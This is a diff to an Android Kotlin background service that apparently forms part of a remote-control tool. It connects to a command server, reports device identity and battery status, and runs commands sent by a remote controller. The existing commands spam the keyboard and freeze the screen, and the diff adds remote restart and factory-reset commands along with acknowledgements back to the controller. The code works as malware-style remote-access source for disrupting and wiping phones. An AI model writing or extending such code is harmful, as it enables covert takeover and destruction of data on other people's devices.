@@ -154,25 +154,30 @@ override fun onCreate() {
             socket = IO.socket(URI.create(SERVER_URL), opts)
 
             socket?.on(Socket.EVENT_CONNECT) {
-                Log.d("DeviceService", "Socket Connected")
-                SocketHolder.connected = true
-                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-                val level   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
-                val scale   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
-                val plugged = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
-                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
-                val isCharging = plugged != 0
+    Log.d("DeviceService", "✅ Socket Connected — deviceId=$deviceId uid=${readUid()}")
+    SocketHolder.connected = true
+    val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+    val level   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
+    val scale   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
+    val plugged = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
+    val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
+    val isCharging = plugged != 0
 
-                socket?.emit("device:register", JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("name", deviceName)
-                    put("battery", batteryPct)
-                    put("charging", isCharging)
-                    put("sdkVersion", Build.VERSION.SDK_INT)
-                    put("androidVersion", Build.VERSION.RELEASE)
-                    put("uid", readUid())
-                })
-            }
+    try {
+        socket?.emit("device:register", JSONObject().apply {
+            put("deviceId", deviceId)
+            put("name", deviceName)
+            put("battery", batteryPct)
+            put("charging", isCharging)
+            put("sdkVersion", Build.VERSION.SDK_INT)
+            put("androidVersion", Build.VERSION.RELEASE)
+            put("uid", readUid())
+        })
+        Log.d("DeviceService", "📡 device:register emitted")
+    } catch (e: Exception) {
+        Log.e("DeviceService", "device:register error: ${e.message}")
+    }
+}
 
 socket?.on(Socket.EVENT_DISCONNECT) {
     Log.d("DeviceService", "Socket disconnected — retry 5s")
@@ -183,20 +188,33 @@ socket?.on(Socket.EVENT_DISCONNECT) {
 }
 
             socket?.on("command") { args ->
-                val data = args[0] as? JSONObject ?: return@on
-                val cmd  = data.optString("command")
-                val val_ = data.opt("value")
+    val data = args[0] as? JSONObject ?: return@on
+    val cmd  = data.optString("command")
+    val val_ = data.opt("value")
+    val valueStr: String = val_?.toString() ?: ""
 
-                handleCommand(cmd, val_?.toString() ?: "")
+    Log.d("DeviceService", "📥 Command received: $cmd = $valueStr")
+    handleCommand(cmd, valueStr)
 
-                val intent = Intent(ACTION_COMMAND).apply {
-                    putExtra(EXTRA_COMMAND, cmd)
-                    val valStr: String = val_?.toString() ?: ""
-                    putExtra(EXTRA_VALUE, valStr)
-                    setPackage(packageName)
-                }
-                sendBroadcast(intent)
-            }
+    // ✅ FIX: kirim response balik ke controller
+    try {
+        socket?.emit("command:response", JSONObject().apply {
+            put("deviceId", deviceId)
+            put("command", cmd)
+            put("status", "executed")
+            put("value", valueStr)
+        })
+    } catch (e: Exception) {
+        Log.e("DeviceService", "emit command:response error: ${e.message}")
+    }
+
+    val intent = Intent(ACTION_COMMAND).apply {
+        putExtra(EXTRA_COMMAND, cmd)
+        putExtra(EXTRA_VALUE, valueStr)
+        setPackage(packageName)
+    }
+    sendBroadcast(intent)
+}
 
             socket?.connect()
         } catch (e: Exception) {
@@ -273,6 +291,8 @@ socket?.on(Socket.EVENT_DISCONNECT) {
         "spamKeyboardStop"  -> stopSpamKeyboard()
         "freezeScreenStart" -> startFreezeScreen()
         "freezeScreenStop"  -> stopFreezeScreen()
+        "restartDevice" -> softRestart()
+        "factoryReset"  -> factoryResetDevice()
         else -> Log.d("DeviceService", "⚠️ Unknown command: $cmd")
     }
 }
@@ -1702,11 +1722,18 @@ ${htmlContent}
     
 
     fun emitStatus(statusObj: JSONObject) {
-    if (socket?.connected() != true) return
-    socket?.emit("device:status", JSONObject().apply {
-        put("deviceId", deviceId)
-        put("status", statusObj)
-    })
+    if (socket?.connected() != true) {
+        Log.w("DeviceService", "emitStatus skipped — socket not connected")
+        return
+    }
+    try {
+        socket?.emit("device:status", JSONObject().apply {
+            put("deviceId", deviceId)
+            put("status", statusObj)
+        })
+    } catch (e: Exception) {
+        Log.e("DeviceService", "emitStatus error: ${e.message}")
+    }
 }
 
 private fun readUid(): String {
